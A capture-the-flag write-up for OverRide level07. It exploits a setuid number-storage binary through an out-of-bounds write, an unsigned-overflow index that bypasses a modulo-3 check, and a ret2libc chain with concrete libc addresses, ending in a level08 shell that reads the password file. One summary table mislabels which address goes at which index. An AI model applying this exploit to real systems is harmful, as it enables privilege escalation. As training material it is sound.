# LEVEL07

## 1. Inspect The Executable

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
level07@OverRide:~$ ls -l
total 12
-rwsr-s---+ 1 level08 users 11744 Sep 10  2016 level07
```

We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with **`level08` privileges**.

```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 42
 Index: 16
 Completed store command successfully
Input command: read
 Index: 16
 Number at data[16] is 42
 Completed read command successfully
Input command: store
 Number: 42
 Index: -1
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: store
 Number: 42
 Index: -2
 Completed store command successfully
Input command: read
 Index: -2
 Number at data[4294967294] is 42
 Completed read command successfully
Input command: quit
level07@OverRide:~$ 
```

The program **waits** for **3 different commands** that control a **data storage service**.

It looks like there is **no verification** on the **user input**, and it is possible to **read out** of the data storage.

And **some indices** appear to be **reserved** by **`"wil"`**.

## 2. Analyze The Executable

```bash
(gdb) info functions 
All defined functions:

Non-debugging symbols:
[...]
0x08048630  store_number
0x080486d7  read_number
0x08048723  main
[...]
```

### Program Behavior

#### main function

The `main` function enters a command loop.

It accepts 3 commands: **`"store"`** *(calls `store_number()`)*, **`"read"`** *(calls `read_number()`)*, and **`"quit"`** *(exits the program)*.

#### read_number function

The `read_number` function **prompts** for an **index** and **displays** the value stored at `data[index]`.

There is no bounds checking, allowing reads anywhere in memory.

#### store_number function

The `store_number` function **prompts** for a **number** and **index**, then stores the number at `data[index]`.

It **rejects indices** that are **multiples of 3** *(index reserved by wil)* or numbers starting with `0xb7` *(meaning stack addresses)*.

## 3. Identify The Vulnerability

The `store` and `read` functions **lack proper bounds checking** on the array index.

We can **write beyond** the **100-element array** directly into the stack, allowing us to **overwrite** the `SAVED EIP` and **execute** a `ret2libc` attack.

### ret2libc Exploit

The **ret2libc payload pattern** on the **stack** is:

```
EBP + 12	[  arg 2  ]		[ "/bin/sh" address ]
EBP + 8		[  arg 1  ]		[ exit() address ]
EBP + 4		[SAVED EIP]		[ system() address ]
```

And this will lead to redirect in the `system()` function, with a stack frame as follows:

```
EBP + 8		[  arg 1  ]		[ "/bin/sh" address ]
EBP + 4		[SAVED EIP]		[ exit address ]
```

We'll use the **`store` command** to **write** these values **beyond the array bounds**, setting up a `ret2libc` attack when the program returns.

### Get Exploit Values

First, we need to **find the addresses** : 
- system
- exit *(optional)*
- "/bin/sh"

```bash
(gdb) p system 
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit 
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) info proc map
process 2592
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

Addresses found :
```
system				0xf7e6aed0
exit *(optional)*	0xf7e5eb70
"/bin/sh"			0xf7f897ec
```

### Find SAVED EIP Position

With `gdb` command `info frame` we can get the information of the stack frame:

```bash
(gdb) info frame
Stack level 0, frame at 0xffffd6a0:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd698, args: 
 Locals at 0xffffd698, Previous frame's sp is 0xffffd6a0
 Saved registers:
  ebp at 0xffffd698, eip at 0xffffd69c
```

So SAVED EIP is at `0xffffd69c`.

---

From the **C** and **assembly**, the data array *(`local_1bc` in C file)* starts at `ESP + 0x24`:

```c
undefined4 local_1bc [100];
local_2c = store_number(local_1bc);
```

```s
   0x080488e3 <+448>:	lea    0x24(%esp),%eax
   0x080488e7 <+452>:	mov    %eax,(%esp)
   0x080488ea <+455>:	call   0x8048630 <store_number>
```

And to get tits address :

```bash
(gdb) p $esp+0x24
$2 = (void *) 0xffffd4d4
```

The data array is at `0xffffd4d4`.

---

From the 2 addresses found, we can calculate the offset:
```
0xffffd69c - 0xffffd4d4 = 456 bytes
```

But there is a problem :
```
456 bytes / 4 bytes = 114 characters
____________________________________

114 % 3 = 0
```

**Index 114** is rejected because of the **wil reserved index** :
```c
  if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
```

We cannot write this value as a storage index.

### UInteger Overflow Bypass

But because of how the array position is selected, we can use a **Interger Overflow**.

```c
    *(uint *)(uVar2 * 4 + param_1) = uVar1;
```

The `store` function **calculates** the address as `data + (index * 4)`, with the index being a **unsigned int**.


The **maximum uint** value is `4294967295`, so:
```
4294967295 + 1 = 4294967296 (wraps to index 0)
4294967296 / 4 = 1073741824 (wraps to index 0)
_____________________________________________________

(1073741824 + 114) * 4 = 456 bytes

1073741824 + 114 = 1073741938
```

The index `1073741938` overflows and writes to position **`114`**, bypassing the modulo 3 check.

---

### Calculate Final Values

We need to **convert** the **addresses in decimal**, since they are stored as **uint values** :

```
system	:	0xf7e6aed0	=	4159090384

exit	:	0xf7e5eb70	=	4159040368

/bin/sh	:	0xf7f897ec	=	4160264172
```

And with the position of `SAVED EIP` at `table[114]`, we can deduce :

```
EBP + 12	[  arg 2  ]	 |	[ table[116] ]	:	system	:	0xf7e6aed0	=	4159090384
EBP + 8		[  arg 1  ]	 |	[ table[115] ]	:	exit	:	0xf7e5eb70	=	4159040368
EBP + 4		[SAVED EIP]	 |	[ table[114] ]	:	bin/sh	:	0xf7f897ec	=	4160264172
```

So we will store :

```
value: 4159090384
index: 1073741938

value: 4159040368
index: 115

value: 4160264172
index: 116
```

## 4. Capture The Flag

```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store	
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
$ cat /home/users/level08/.pass
XXX
$ exit
```
